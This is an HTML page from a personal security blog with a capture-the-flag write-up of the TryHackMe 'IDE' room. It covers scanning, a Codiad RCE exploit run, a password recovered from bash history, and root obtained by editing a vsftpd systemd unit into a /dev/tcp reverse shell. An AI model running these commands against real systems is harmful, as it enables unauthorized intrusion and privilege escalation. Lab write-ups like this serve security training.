@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Enmeration nmap Discovered open port 21/tcp on 10.10.6.68 Discovered open port 80/tcp on 10.10.6.68 Discovered open port 22/tcp on 10.10.6.68 Discovered open port 62337/tcp on 10.10.6.68 PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.226.203 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/ide/ide/" />
+
+
+    <title>
+        
+            IDE :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="IDE">
+<meta itemprop="description" content="Enmeration nmap Discovered open port 21/tcp on 10.10.6.68 Discovered open port 80/tcp on 10.10.6.68 Discovered open port 22/tcp on 10.10.6.68 Discovered open port 62337/tcp on 10.10.6.68 PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.226.203 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3."><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="dateModified" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="wordCount" content="879"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content="IDE"/>
+<meta name="twitter:description" content="Enmeration nmap Discovered open port 21/tcp on 10.10.6.68 Discovered open port 80/tcp on 10.10.6.68 Discovered open port 22/tcp on 10.10.6.68 Discovered open port 62337/tcp on 10.10.6.68 PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.226.203 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3."/>
+
+
+
+    <meta property="og:title" content="IDE" />
+<meta property="og:description" content="Enmeration nmap Discovered open port 21/tcp on 10.10.6.68 Discovered open port 80/tcp on 10.10.6.68 Discovered open port 22/tcp on 10.10.6.68 Discovered open port 62337/tcp on 10.10.6.68 PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.226.203 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/ide/ide/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
+<meta property="article:modified_time" content="2022-09-20T16:00:31+01:00" /><meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/ide/ide/">IDE</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <!-- raw HTML omitted -->
+<h2 id="enmeration">Enmeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>Discovered open port 21/tcp on 10.10.6.68
+Discovered open port 80/tcp on 10.10.6.68
+Discovered open port 22/tcp on 10.10.6.68
+Discovered open port 62337/tcp on 10.10.6.68
+
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.8.226.203
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94RvPaQ09Xx+jMj32opOMbghuvx4OeBVLc+/4Hascmrtsa+SMtQGSY7b+eyW8Zymxi94rGBIN2ydPxy3XXGtkaCdQluOEw5CqSdb/qyeH+L/1PwIhLrr+jzUoUzmQil+oUOpVMOkcW7a00BMSxMCij0HdhlVDNkWvPdGxKBviBDEKZAH0hJEfexz3Tm65cmBpMe7WCPiJGTvoU9weXUnO3+41Ig8qF7kNNfbHjTgS0+XTnDXk03nZwIIwdvP8dZ8lZHdooM8J9u0Zecu4OvPiC4XBzPYNs+6ntLziKlRMgQls0e3yMOaAuKfGYHJKwu4AcluJ/+g90Hr0UqmYLHEV
+|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBzKTu7YDGKubQ4ADeCztKu0LL5RtBXnjgjE07e3Go/GbZB2vAP2J9OEQH/PwlssyImSnS3myib+gPdQx54lqZU=
+|   256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+oGPm8ZVYNUtX4r3Fpmcj9T9F2SjcRg4ansmeGR3cP
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+PORT      STATE SERVICE REASON  VERSION
+62337/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
+|_http-title: Codiad 2.8.4
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+</code></pre><h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code>.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
+.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
+.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
+components              [Status: 301, Size: 322, Words: 20, Lines: 10]
+data                    [Status: 301, Size: 316, Words: 20, Lines: 10]
+favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1]
+index.php               [Status: 200, Size: 5239, Words: 1739, Lines: 87]
+js                      [Status: 301, Size: 314, Words: 20, Lines: 10]
+languages               [Status: 301, Size: 321, Words: 20, Lines: 10]
+lib                     [Status: 301, Size: 315, Words: 20, Lines: 10]
+plugins                 [Status: 301, Size: 319, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
+themes                  [Status: 301, Size: 318, Words: 20, Lines: 10]
+</code></pre><p>The room said enumeration is important so we took that personally.</p>
+<p>full nmap scan or you miss the main thing&hellip;the real website is on port 62337</p>
+<p>But first lets grab whatever is in ftp folder</p>
+<p>At first I thought ftp folder was empty&hellip;the subfolder was named <code>...</code></p>
+<p>cd into it and find a file named <code>-</code></p>
+<pre tabindex="0"><code>Hey john,
+I have reset the password as you have asked. Please use the default password to login.
+Also, please take care of the image file ;)
+- drac.
+</code></pre><p>nmap says the actual website use codiad 2.8.4</p>
+<p>As we dont know what that is we google but found its a web ide</p>
+<p>And there is an RCE vulnerability with exploitdb script</p>
+<p>random passwords trials got us in the web ide (I was about to bruteforce with hydra lol)</p>
+<p><code>john : password</code></p>
+<p>As we can login we see the code john was workig on but nothing useful in it</p>
+<p>let&rsquo;s use the exploit db python script to get inside</p>
+<p><code>python exploit.py http://10.10.172.231:62337/ john password 10.8.226.203 2311 linux</code></p>
+<p>And we are in</p>
+<p>first we get comfortable</p>
+<p><code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<pre tabindex="0"><code>www-data@ide:/home$ cd drac
+cd drac
+www-data@ide:/home/drac$ ls
+ls
+user.txt
+www-data@ide:/home/drac$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+</code></pre><p>I am not even surprised</p>
+<pre tabindex="0"><code>ls -al
+total 52
+drwxr-xr-x 6 drac drac 4096 Aug 4 07:06 .
+drwxr-xr-x 3 root root 4096 Jun 17 14:01 ..
+-rw------- 1 drac drac 49 Jun 18 06:02 .Xauthority
+-rw-r--r-- 1 drac drac 36 Jul 11 12:11 .bash_history
+-rw-r--r-- 1 drac drac 220 Apr 4 2018 .bash_logout
+-rw-r--r-- 1 drac drac 3787 Jul 11 11:53 .bashrc
+drwx------ 4 drac drac 4096 Jun 18 06:03 .cache
+drwxr-x--- 3 drac drac 4096 Jun 18 06:47 .config
+drwx------ 4 drac drac 4096 Jun 18 06:48 .gnupg
+drwx------ 3 drac drac 4096 Jun 18 05:49 .local
+-rw-r--r-- 1 drac drac 807 Apr 4 2018 .profile
+-rw-r--r-- 1 drac drac 0 Jun 17 14:03 .sudo_as_admin_successful
+-rw------- 1 drac drac 557 Jun 18 05:49 .xsession-errors
+-r-------- 1 drac drac 33 Jun 18 06:32 user.txt
+</code></pre><p>ok drac only can read the flag but anyone can read his bash history&hellip;lol</p>
+<p>that thing is supposed to go to void (/dev/null)</p>
+<pre tabindex="0"><code>cat .bash_history
+mysql -u drac -p &#39;Th3dRaCULa1sR3aL&#39;
+
+www-data@ide:/home/drac$ su drac
+su drac
+Password: Th3dRaCULa1sR3aL
+</code></pre><p><code>drac@ide:~$ cat user.txt</code></p>
+<p>And we got User Flag</p>
+<p>Now privileges</p>
+<h2 id="privilege-escalation">privilege escalation</h2>
+<pre tabindex="0"><code>sudo -l
+
+Matching Defaults entries for drac on ide:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User drac may run the following commands on ide:
+(ALL : ALL) /usr/sbin/service vsftpd restart
+</code></pre><p>The ftp service? hmm? I dont know</p>
+<pre tabindex="0"><code>locate vsftpd.service
+/etc/systemd/system/multi-user.target.wants/vsftpd.service
+
+cd /etc/systemd/system/multi-user.target.wants
+
+cat vsftpd.service
+
+[Unit]
+Description=vsftpd FTP server
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
+ExecReload=/bin/kill -HUP $MAINPID
+ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
+
+[Install]
+WantedBy=multi-user.target
+</code></pre><p>Alright let&rsquo;s change the <code>ExecStart</code> to a reverse shell</p>
+<pre tabindex="0"><code>[Unit]
+Description=vsftpd FTP server
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.8.226.203/4444 0&gt;&amp;1&#39;
+ExecReload=/bin/kill -HUP $MAINPID
+ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
+
+[Install]
+WantedBy=multi-user.target
+</code></pre><p>We echo all that in <code>vsftpd.service</code> and listen with a new netcat on said port</p>
+<p>Now we restart the service..reload daemon first</p>
+<pre tabindex="0"><code>systemctl daemon-reload
+==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
+Authentication is required to reload the systemd state.
+Authenticating as: drac
+Password: Th3dRaCULa1sR3aL
+
+==== AUTHENTICATION COMPLETE ===
+</code></pre><pre tabindex="0"><code>drac@ide:/etc/systemd/system/multi-user.target.wants$ sudo /usr/sbin/service vsftpd restart
+</code></pre><p>Aaand&hellip;NOTHING</p>
+<p>I don&rsquo;t know why but I had to do the restart twice</p>
+<pre tabindex="0"><code>root@ide:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+cat root.txt
+</code></pre><p>Great room! Get some more!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
+
+
+
+    </body>
+</html>
